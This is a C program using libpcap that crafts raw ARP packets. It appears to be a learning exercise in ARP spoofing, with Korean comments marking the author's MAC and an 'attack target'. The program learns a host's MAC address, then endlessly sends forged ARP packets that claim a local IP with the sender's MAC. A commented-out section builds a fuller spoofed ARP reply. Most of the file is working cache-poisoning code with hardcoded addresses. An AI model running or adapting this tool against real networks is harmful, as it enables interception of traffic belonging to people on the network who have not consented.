#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <pcap/pcap.h>

#include <sys/types.h>
// #include<arpa/inet.h>
// #include<linux/if_arp.h>
#include <netinet/in.h>
#include <netinet/ether.h>
// #include <linux/if_arp.h>
// #include<net/ethernet.h>
// #include <net/if_arp.h>

typedef struct arp_hdr {
    u_int16_t htype;    /* Hardware Type           */
    u_int16_t ptype;    /* Protocol Type           */
    u_char hlen;        /* Hardware Address Length */
    u_char plen;        /* Protocol Address Length */
    u_int16_t oper;     /* Operation Code          */
    u_char sha[6];      /* Sender hardware address */
    u_char spa[4];      /* Sender IP address       */
    u_char tha[6];      /* Target hardware address */
    u_char tpa[4];      /* Target IP address       */
} arpHdr;

typedef struct fullarp {
    struct ethhdr eth_hdr;
    struct arp_hdr arp_hdr;
} fullarphdr;

void USARTWrite(const void *object, size_t size)
{
    const unsigned char *byte;
    int i = 0;
    for ( byte = object; size--; ++byte )
    {
        printf("%02X", *byte);
        i ++;
        if(i%16 == 0) {
            puts("");
        }
    }
    putchar('\n');
}

int main(int argc, char const *argv[]) {

    pcap_t *handle;					/* Session handle */
    const char *dev;						/* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    struct bpf_program fp;			/* The compiled filter */
    struct pcap_pkthdr header;		/* The header that pcap gives us */
    bpf_u_int32 mask;				/* Our netmask */
    bpf_u_int32 net;				/* Our IP */
    u_char packet[100];			/* The actual packet */
    char *recvPacket;

    char* sender;
    char* target;

    if(argc != 4)   {
        printf("\n\nUsage : %s [network] [Sender] [target]\n\n", argv[0]);
        return 2;
    }


    struct in_addr iaddr;

    dev = argv[1];

  /* Error 제어 { */
    if(dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1) { fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf); net = 0; mask = 0; }
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
  /*}*/


    struct fullarp fullarp;

    memcpy(fullarp.eth_hdr.h_dest, "\xff\xff\xff\xff\xff\xff", 6); // 브로드케스트
    memcpy(fullarp.eth_hdr.h_source, "\xf4\x8c\x50\x8c\xda\xc0", 6); // 내 맥주소
    fullarp.eth_hdr.h_proto = htons(ETH_P_ARP);
    fullarp.arp_hdr.htype = htons(ARPHRD_ETHER);
    fullarp.arp_hdr.ptype = htons(0x0800);
    fullarp.arp_hdr.hlen = 6;
    fullarp.arp_hdr.plen = 4;
    fullarp.arp_hdr.oper = htons(ARPOP_REQUEST);
    memcpy(fullarp.arp_hdr.sha, "\xf4\x8c\x50\x8c\xda\xc0", 6); // 내 맥주소
    memcpy(fullarp.arp_hdr.spa, "\xc0\xa8\x0a\x01", 4); // 공격 대상
    memcpy(fullarp.arp_hdr.tha, "\x00\x00\x00\x00\x00\x00", 6);
    memcpy(fullarp.arp_hdr.tpa, "\xc0\xa8\x0a\x65", 4);

    unsigned char* ptr;
    ptr = (unsigned char*)&fullarp;
    // *(ptr+sizeof(eth_hdr)) = (unsigned char*)&arp_hdr;
    USARTWrite(ptr, sizeof(fullarp));

    if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
    {
        printf("Error sending the packet: %s\n", pcap_geterr(handle));
        return 2;
    }

    char senderMac[7];

    int chk = 0;
    while(1) {
    	chk = pcap_next_ex(handle, &header, &recvPacket);
		if(chk != 1 ) continue;
        if(recvPacket[12] == 8 && recvPacket[13] == 6)    {
            if(recvPacket[20] == 0 && recvPacket[21] == 2) {
                memcpy(fullarp.eth_hdr.h_dest, recvPacket + 22, 6);
                break;
            }
        }
	}

    while(1) {
        if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
        {
            printf("Error sending the packet: %s\n", pcap_geterr(handle));
            return 2;
        }
        puts("Go");
        sleep(1);
    }

    // printf("%s\n", ether_ntoa((const struct ether_addr*)senderMac));


    // printf("\n%d\n", eth_hdr.h_proto);

    // printf("%x", arp_hdr);


  // 맥 주소 받기
  // 성경이 누나에게 받은 부분
    // int fd;
    // struct ifreq ifr;
    // struct ether_header *ETH;
    // struct ether_arp arph;
    // fd = socket(AF_INET, SOCK_DGRAM, 0);
    // ifr.ifr_addr.sa_family = AF_INET;
    // strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
    // ioctl(fd, SIOCGIFADDR, &ifr);  //ip address
    // struct in_addr my_ip = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;
    // ioctl(fd, SIOCGIFHWADDR, &ifr); //mac address
    // u_int8_t my_mac[ETH_ALEN];
    // memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    // close(fd);
  // 끝



    // u_char dstMac[7] = "\x00\x50\x56\xc0\x00\x08";
    // u_char *srcMac = my_mac;
    // u_char dstMac[7] = "\xff\xff\xff\xff\xff\xff";
    //
    // memcpy(sendHdr.eh.dstMac, dstMac, 6);
    // memcpy(sendHdr.eh.srcMac, srcMac, 6);
    // memcpy(sendHdr.eh.etherType, "\x08\x06", 2); // ARP
    //
    // memcpy(sendHdr.ht, "\x00\x01", 2);
    // memcpy(sendHdr.pt, "\x08\x00", 2);
    // memcpy(sendHdr.hal, "\x06", 1);
    // memcpy(sendHdr.pal, "\x04", 1);
    // memcpy(sendHdr.op, "\x00\x01", 2); // OPCODE
    //
    // memcpy(sendHdr.sha, srcMac, 6);
    //
    // inet_pton(AF_INET, argv[2], &iaddr.s_addr);
    // memcpy(sendHdr.spa, &iaddr.s_addr, 4); //C0A8EE82 // "\xc0\xa8\x20\xfe"
    //
    // memcpy(sendHdr.dha, "\x00\x00\x00\x00\x00\x00", 6);
    //
    // inet_pton(AF_INET, argv[3], &iaddr.s_addr);
    // memcpy(sendHdr.dpa, &iaddr.s_addr, 4); // "\xc0\xa8\x20\x01"
    //
    // memset(packet, 0x00, 100);
    // memcpy(packet, (void *)&sendHdr, sizeof(sendHdr));

    // pcap_sendpacket(handle, packet, 60);
    //
    // char yourmac[7];
    //
    // int chk = 0;
    // while(1) {
    // 	chk = pcap_next_ex(handle, &header, &recvPacket);
	// 	if(chk != 1 ) continue;
    //     if(recvPacket[12] == 8 && recvPacket[13] == 6)    {
    //         printf("\n%x-%x", recvPacket[20], recvPacket[21]);
    //         if(recvPacket[20] == 0 && recvPacket[21] == 2) {
    //             dumpcode(recvPacket, 60);
    //             memcpy(yourmac, recvPacket + 22, 6);
    //             break;
    //         }
    //     }
	// }
    //
    // printf("%s\n", ether_ntoa((const struct ether_addr*)yourmac));


    //
    // memcpy(sendHdr.eh.dstMac, yourmac, 6);
    // memcpy(sendHdr.eh.srcMac, srcMac, 6);
    // memcpy(sendHdr.eh.etherType, "\x08\x06", 2); // ARP
    //
    // memcpy(sendHdr.ht, "\x00\x01", 2);
    // memcpy(sendHdr.pt, "\x08\x00", 2);
    // memcpy(sendHdr.hal, "\x06", 1);
    // memcpy(sendHdr.pal, "\x04", 1);
    // memcpy(sendHdr.op, "\x00\x02", 2); // OPCODE
    //
    // memcpy(sendHdr.dha, srcMac, 6);
    //
    // inet_pton(AF_INET, argv[2], &iaddr.s_addr);
    // memcpy(sendHdr.dpa, &iaddr.s_addr, 4); //C0A8EE82 // "\xc0\xa8\x20\xfe"
    //
    // memcpy(sendHdr.sha, my_mac, 6);
    //
    // inet_pton(AF_INET, argv[3], &iaddr.s_addr);
    // memcpy(sendHdr.spa, &iaddr.s_addr, 4); // "\xc0\xa8\x20\x01"
    //
    // memset(packet, 0x00, 100);
    // memcpy(packet, (void *)&sendHdr, sizeof(sendHdr));
    //
    // pcap_sendpacket(handle, packet, 60);
    //
    return 0;
}
